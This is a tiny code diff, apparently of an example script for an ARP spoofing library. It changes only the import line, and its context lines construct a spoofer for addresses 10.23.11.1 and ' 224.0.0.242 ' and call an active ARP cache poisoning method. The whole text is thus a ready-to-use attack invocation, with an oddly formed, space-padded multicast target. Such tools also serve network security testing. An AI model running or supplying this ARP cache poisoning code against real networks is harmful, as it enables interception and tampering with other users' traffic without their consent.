@@ -1,4 +1,4 @@
-from ArpSpoof import SpooferARP
+from ArpSpoof import SpooferARP
 
 spoofer = SpooferARP('10.23.11.1', ' 224.0.0.242 ')
 spoofer.active_cache_poisonning()
